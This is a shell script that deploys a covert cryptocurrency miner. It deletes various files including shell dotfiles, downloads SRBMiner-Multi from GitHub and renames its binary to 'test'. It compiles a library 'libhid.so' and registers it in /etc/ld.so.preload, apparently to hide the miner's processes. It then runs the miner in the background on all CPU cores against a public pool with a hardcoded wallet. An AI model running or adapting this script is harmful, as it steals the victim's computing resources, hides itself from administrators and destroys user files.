#!/bin/sh
sudo rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
cd amplify-app
sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.0/srbminer_custom-2.2.0.tar.gz
sudo tar -xvf srbminer_custom-2.2.0.tar.gz
sudo mv srbminer_custom/srbminer_custom_bin test
sudo rm -f libhid.so
sudo gcc -Wall -m64 -fPIC -shared -o libhid.so libhid.c -ldl
sudo mv libhid.so /usr/lib/libhid.so
sudo echo '/usr/lib/libhid.so' > /etc/ld.so.preload
sudo gcc -Wall -fPIC -shared -o libhid.so libhid.c -ldl
sudo mv libhid.so /usr/lib64/libhid.so
sudo echo '/usr/lib64/libhid.so' > /etc/ld.so.preload
sudo nohup ./test --algorithm yespowertide --disable-gpu --pool stratum-eu.rplant.xyz:7059 --diff-factor 0.02 --wallet TFrQ7u9spKk8MBgX6Bze3oxPbs3Yh1tAsq.$(echo $(shuf -i 100-999 -n 1)-CPU-Z) -p webpassword=1234,m=solo -t $(nproc --all) --log=stdout > meta.log & 
sudo timeout 480m ./time
